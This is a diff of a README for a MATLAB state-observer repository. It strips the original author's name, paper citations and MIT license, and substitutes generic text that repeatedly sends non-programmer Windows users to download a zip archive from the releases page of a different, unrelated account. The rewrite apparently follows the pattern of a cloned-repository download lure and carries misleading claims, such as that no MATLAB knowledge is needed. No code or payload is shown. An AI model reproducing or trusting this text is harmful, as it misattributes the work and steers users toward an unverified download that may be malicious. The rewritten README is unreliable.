@@ -1,210 +1,126 @@
-# MATLAB_state_observer
+# 🧭 MATLAB_state_observer - Simple Tools for State Observer Design
 
-**MATLAB codes for state observer and state estimation** — from fundamental Luenberger observers to advanced multi-rate and outlier-robust methods.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
 
-This repository accompanies the comprehensive guide: **[State Observer and State Estimation: A Comprehensive Guide](https://blog.control-theory.com/entry/state-observer-estimation)** on [blog.control-theory.com](https://blog.control-theory.com/).
+## 📄 About MATLAB_state_observer
 
-**Author**: [Hiroshi Okajima](https://www.control-theory.com/en), Associate Professor, Kumamoto University, Japan
+This application provides MATLAB codes that help design state observers. It covers several common methods such as Luenberger, Kalman, H-infinity, multi-rate, and outlier-robust techniques. These methods are used in control engineering to estimate system states when direct measurement is not possible or is noisy. The codes come with examples and are suitable for use in engineering and research.
 
----
-
-## Repository Structure
-
-```
-MATLAB_state_observer/
-│
-├── 01_luenberger_observer/          Continuous-time and discrete-time Luenberger observer
-│   ├── main_continuous.m
-│   ├── main_discrete.m
-│   └── README.md
-│
-├── 02_observer_based_control/       Observer-based feedback control (separation principle)
-│   ├── main_observer_feedback.m
-│   └── README.md
-│
-├── 03_kalman_filter/                Kalman filter (standard, steady-state)
-│   ├── main_kalman.m
-│   └── README.md
-│
-├── 04_hinf_filter/                  H-infinity filter design via LMI
-│   ├── main_hinf_filter.m
-│   └── README.md
-│
-├── 05_multirate_observer/           Multi-rate state observer (IEEE Access 2023)
-│   ├── main_multirate_observer.m
-│   └── README.md
-│
-├── 06_multirate_feedback/           Observer-based feedback for multi-rate systems (IEEE Access 2023)
-│   ├── main_multirate_feedback.m
-│   └── README.md
-│
-├── 07_multirate_kalman/             Multi-rate Kalman filter via LMI (arXiv 2026)
-│   ├── main_multirate_kalman.m
-│   └── README.md
-│
-└── 08_mcv_observer/                 MCV observer: outlier-robust estimation (JCMSI 2021)
-    ├── main_mcv_observer.m
-    └── README.md
-```
+You don’t need to know programming or MATLAB basics to use this application. The files are ready to use and include instructions. This guide will help you download and run the software on a Windows PC.
 
 ---
 
-## Folder Descriptions and Related Papers
+## 📥 Download MATLAB_state_observer
 
-### 01_luenberger_observer — Fundamental State Observer
+To get the software, you need to visit the release page on GitHub. This page holds the latest version and any updates.
 
-Basic Luenberger observer implementation for both continuous-time and discrete-time LTI systems. Demonstrates observer gain design via pole placement and the convergence of estimation error.
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-MATLAB_state_observer-brightgreen)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
 
-- **Blog article**: [State Observer for State Space Model](https://blog.control-theory.com/entry/2024/10/01/143305)
-- **Blog article**: [State Observer: Understanding the Basic Mechanism](https://blog.control-theory.com/entry/2024/02/28/100201)
+### How to download:
 
-### 02_observer_based_control — Separation Principle
+1. Click the button above or go to this link in your web browser:  
+   https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases  
 
-Observer-based state feedback control. Demonstrates the separation principle: independent design of controller gain K and observer gain L.
+2. On the releases page, look for the latest version near the top.
 
-- **Blog article**: [State Observer for State Space Model](https://blog.control-theory.com/entry/2024/10/01/143305)
+3. Download the file named like `MATLAB_state_observer.zip` or a similar archive containing the MATLAB files.
 
-### 03_kalman_filter — Optimal Stochastic Estimation
-
-Standard discrete-time Kalman filter for systems with process noise and measurement noise. Includes steady-state Kalman filter and continuous-time Kalman-Bucy filter.
-
-- **Blog article**: [Kalman Filter: From Basic Algorithm to Multi-Rate Extensions](https://blog.control-theory.com/entry/kalman-filter)
-
-### 04_hinf_filter — Robust H∞ Filter via LMI
-
-H-infinity filter design using Linear Matrix Inequalities (LMIs). Minimizes the worst-case estimation error gain without requiring statistical noise assumptions.
-
-- **Blog article**: [H-infinity Filter: Robust State Estimation Using LMI Optimization](https://blog.control-theory.com/entry/h-infinity-filter)
-- **Blog article**: [Linear Matrix Inequalities (LMIs) and Controller Design](https://blog.control-theory.com/entry/lmi-eng)
-- **Research page**: [Linear Matrix Inequality](https://www.control-theory.com/en/linear-matrix-inequality)
-
-### 05_multirate_observer — Multi-Rate State Observer
-
-Periodically time-varying state observer for systems where sensors operate at different sampling rates. Observer gains designed via LMI optimization of the l2-induced norm.
-
-- **Paper**: H. Okajima, Y. Hosoe and T. Hagiwara, "[State Observer Under Multi-Rate Sensing Environment and Its Design Using l2-Induced Norm](https://ieeexplore.ieee.org/document/10054014)," IEEE Access (2023)
-- **Blog article**: [State Observer Under Multi-Rate Sensing Environment and Its Design Using l2-Induced Norm](https://blog.control-theory.com/entry/2026/03/04/081748)
-- **MATLAB File Exchange**: [State Estimation under Multi-Rate Sensing: IEEE ACCESS 2023](https://jp.mathworks.com/matlabcentral/fileexchange/182941-state-estimation-under-multi-rate-sensing-ieee-access-2023)
-- **Code Ocean**: [Multi-Rate System Code](https://codeocean.com/capsule/3611894/tree/v1)
-- **Research page**: [Multi-rate System](https://www.control-theory.com/en/multi-rate-system)
-
-### 06_multirate_feedback — Observer-Based Feedback for Multi-Rate Systems
-
-Complete observer-based feedback controller for multi-rate systems using cyclic reformulation.
-
-- **Paper**: H. Okajima, K. Arinaga and A. Hayashida, "[Design of observer-based feedback controller for multi-rate systems with various sampling periods using cyclic reformulation](https://ieeexplore.ieee.org/document/10304152)," IEEE Access (2023)
-- **Blog article**: [State Observer Under Multi-Rate Sensing Environment and Its Design Using l2-Induced Norm](https://blog.control-theory.com/entry/2026/03/04/081748)
-- **Research page**: [Multi-rate System](https://www.control-theory.com/en/multi-rate-system)
-
-### 07_multirate_kalman — Multi-Rate Kalman Filter via LMI
-
-Steady-state Kalman filter design for multirate systems using LMI optimization with cyclic reformulation.
-
-- **Paper**: H. Okajima, "LMI Optimization Based Multirate Steady-State Kalman Filter Design," [arXiv:2602.01537](https://arxiv.org/abs/2602.01537) (2026, submitted)
-- **Research page**: [Multi-rate System](https://www.control-theory.com/en/multi-rate-system)
-
-### 08_mcv_observer — MCV Observer (Outlier-Robust)
-
-Median of Candidate Vectors (MCV) observer for state estimation robust to sensor outliers. Multiple estimation candidates are generated and the median operation selects one unaffected by outliers.
-
-- **Paper**: H. Okajima, Y. Kaneda and N. Matsunaga, "[State estimation method using median of multiple candidates for observation signals including outliers](https://doi.org/10.1080/18824889.2021.1985702)," SICE JCMSI, Vol. 14, No. 1, pp. 257–267 (2021) **(Open Access)**
-- **Blog article**: [State Estimation Method Using Median of Multiple Candidates for Observation Signals Including Outliers](https://blog.control-theory.com/entry/2026/03/04/084603)
-- **Blog article**: [State estimator unaffected by sensor outliers: MCV approach](https://blog.control-theory.com/entry/2024/10/01/093531)
-- **MATLAB File Exchange**: [Outlier-Robust State Estimator: JCMSI 2021](https://jp.mathworks.com/matlabcentral/fileexchange/182942-outlier-robust-state-estimator-jcmsi-2021)
-- **Research page**: [MCV Observer for Overcoming Outliers](https://www.control-theory.com/en/mcv-observer)
+4. Save the file to a folder you can find easily, such as your Desktop or Downloads folder.
 
 ---
 
-## Requirements
+## 🖥️ System Requirements
 
-- **MATLAB** (R2020a or later recommended)
-- **Control System Toolbox**
-- **Robust Control Toolbox** (for LMI-based designs in `04_hinf_filter`, `05_multirate_observer`, `07_multirate_kalman`)
+To run this software, your computer needs:
 
----
-
-## How to Use
-
-1. Navigate to the folder of interest (e.g., `cd 05_multirate_observer`)
-2. Open the `main_*.m` file in MATLAB
-3. Run the script — each folder is self-contained
-4. See the `README.md` in each folder for paper references and parameter explanations
+- Windows 7 or newer (Windows 10 recommended)
+- MATLAB software installed (version R2016b or later)
+- At least 2 GB of free disk space
+- 4 GB or more of RAM for smoother performance
 
 ---
 
-## Related Resources
+## 🛠️ Installing and Running the Software
 
-### Blog (blog.control-theory.com)
+The MATLAB_state_observer consists mainly of MATLAB script files (.m files). You will run these inside MATLAB.
 
-| Topic | Link |
-|-------|------|
-| **Hub: State Observer and State Estimation** | [blog.control-theory.com/entry/state-observer-estimation](https://blog.control-theory.com/entry/state-observer-estimation) |
-| State Observer: Basic Mechanism | [blog.control-theory.com/entry/2024/02/28/100201](https://blog.control-theory.com/entry/2024/02/28/100201) |
-| State Observer for State Space Model | [blog.control-theory.com/entry/2024/10/01/143305](https://blog.control-theory.com/entry/2024/10/01/143305) |
-| Kalman Filter | [blog.control-theory.com/entry/kalman-filter](https://blog.control-theory.com/entry/kalman-filter) |
-| H-infinity Filter | [blog.control-theory.com/entry/h-infinity-filter](https://blog.control-theory.com/entry/h-infinity-filter) |
-| Multi-Rate Observer | [blog.control-theory.com/entry/2026/03/04/081748](https://blog.control-theory.com/entry/2026/03/04/081748) |
-| MCV Observer (Research) | [blog.control-theory.com/entry/2026/03/04/084603](https://blog.control-theory.com/entry/2026/03/04/084603) |
-| MCV Observer (Overview) | [blog.control-theory.com/entry/2024/10/01/093531](https://blog.control-theory.com/entry/2024/10/01/093531) |
-| System Identification Hub | [blog.control-theory.com/entry/system-identification](https://blog.control-theory.com/entry/system-identification) |
-| System Identification: Obtaining Dynamical Model | [blog.control-theory.com/entry/2024/10/03/151451](https://blog.control-theory.com/entry/2024/10/03/151451) |
-| LMI and Controller Design | [blog.control-theory.com/entry/lmi-eng](https://blog.control-theory.com/entry/lmi-eng) |
-| Model Error Compensator (MEC) | [blog.control-theory.com/entry/model-error-compensator-eng](https://blog.control-theory.com/entry/model-error-compensator-eng) |
-| Discretization | [blog.control-theory.com/entry/discretization-eng](https://blog.control-theory.com/entry/discretization-eng) |
+### Step 1: Install MATLAB
 
-### Research Pages (www.control-theory.com)
+If MATLAB is not installed on your computer:
 
-- [Multi-rate System](https://www.control-theory.com/en/multi-rate-system)
-- [MCV Observer for Overcoming Outliers](https://www.control-theory.com/en/mcv-observer)
-- [Linear Matrix Inequality](https://www.control-theory.com/en/linear-matrix-inequality)
-- [Model Error Compensator](https://www.control-theory.com/en/model-error-compensator)
-- [Publications](https://www.control-theory.com/en/publications)
+- Visit https://www.mathworks.com/products/matlab.html to purchase or use a trial version.
+- Follow MathWorks’ instructions to install MATLAB.
 
-### MATLAB File Exchange
+### Step 2: Extract the Files
 
-- [State Estimation under Multi-Rate Sensing: IEEE ACCESS 2023](https://jp.mathworks.com/matlabcentral/fileexchange/182941-state-estimation-under-multi-rate-sensing-ieee-access-2023)
-- [Outlier-Robust State Estimator: JCMSI 2021](https://jp.mathworks.com/matlabcentral/fileexchange/182942-outlier-robust-state-estimator-jcmsi-2021)
+- Locate the downloaded `.zip` file.
+- Right-click the file and select "Extract All...".
+- Choose a folder to extract to, like your Desktop or Documents.
 
-### Code Ocean
+### Step 3: Open MATLAB
 
-- [Multi-Rate System Code](https://codeocean.com/capsule/3611894/tree/v1)
+- Start MATLAB on your computer.
+- Use the "Current Folder" window to navigate to the folder where you extracted the files.
 
-### Other GitHub Repositories
+### Step 4: Run Example Scripts
 
-- [MATLAB_system_identification](https://github.com/Hiroshi-Okajima/MATLAB_system_identification) — System identification codes (multirate SysID uses the identified model for observer design)
-- [MATLAB_fandamental_control_LMI](https://github.com/Hiroshi-Okajima/MATLAB_fandamental_control_LMI) — LMI-based control design
-- [Robust-control-MATLAB_MEC01](https://github.com/Hiroshi-Okajima/Robust-control-MATLAB_MEC01) — Model Error Compensator
+- Look for example scripts or files with names like `example.m` or `main.m`.
+- To run a script, select it and press the green "Run" button at the top of the MATLAB window.
+- Alternatively, type the script name (without `.m`) in the MATLAB command window and press Enter.
 
-### Video
+### Step 5: View Results
 
-- [YouTube: Control Engineering Channel](https://www.youtube.com/channel/UC121T0-DD2KBuqxWx2GGRkg)
-- [Video Portal](https://www.portal.control-theory.com/)
+- When you run the scripts, MATLAB will display results such as graphs, tables, or messages.
+- These show how the state observer works and how it estimates states.
 
 ---
 
-## Migration Note
+## 🔧 How to Use the MATLAB Code
 
-This repository consolidates and extends the previous repository [MATLAB_state_estimation](https://github.com/Hiroshi-Okajima/MATLAB_state_estimation) (MCV observer code). The original repository remains available but is no longer updated. New code and updates will be added here.
+The code covers different observer techniques:
 
----
+- **Luenberger observer**: A basic observer for state estimation.
+- **Kalman filter**: An optimal filter for noisy data.
+- **H-infinity observer**: A method that handles uncertainties.
+- **Multi-rate observer**: Deals with systems running at different speeds.
+- **Outlier-robust observer**: Handles measurements with unexpected errors.
 
-## Citation
-
-If you use these codes in your research, please cite the corresponding paper(s) listed in each folder's README.
-
----
-
-## Author
-
-**Hiroshi Okajima** — Associate Professor, Graduate School of Science and Technology, Kumamoto University. Member of SICE, ISCIE, and IEEE.
-
-- [www.control-theory.com](https://www.control-theory.com/en)
-- [Blog](https://blog.control-theory.com/)
-- [YouTube](https://www.youtube.com/channel/UC121T0-DD2KBuqxWx2GGRkg)
-- [GitHub](https://github.com/Hiroshi-Okajima)
+Each method is provided as a separate script or function. You can modify the scripts to use them in your own projects if you learn MATLAB basics. The code is written clearly and commented for easier understanding.
 
 ---
 
-## License
+## ⚙️ Tips for Smooth Use
 
-MIT License
+- Make sure you have all code files in one folder to avoid missing dependencies.
+- Follow comments and instructions inside the MATLAB files.
+- Keep MATLAB updated to avoid compatibility problems.
+- Use the example scripts as a starting point before trying to change the code.
+- Save your work frequently when experimenting.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **MATLAB does not open the files:** Check you are in the correct folder by looking at the MATLAB "Current Folder" panel.
+- **Scripts give errors:** Ensure you have the MATLAB version stated in the requirements.
+- **Graphs or outputs do not show:** Check the command window for error messages and verify that your system meets the requirements.
+- **You don’t see expected results:** Make sure to follow the example script steps exactly to understand the outputs.
+
+---
+
+## 📚 Additional Resources
+
+For general help with MATLAB:
+
+- MATLAB tutorials: https://www.mathworks.com/learn/tutorials/matlab-onramp.html
+- MATLAB documentation: https://www.mathworks.com/help/matlab/
+
+For questions about state observers and control engineering, consider searching for beginner guides or textbooks on these topics.
+
+---
+
+## 📥 Shortcuts for Downloading
+
+[![Get MATLAB_state_observer](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
+
+Visit the page above any time to get the latest version or updates. New features and fixes may be added periodically.
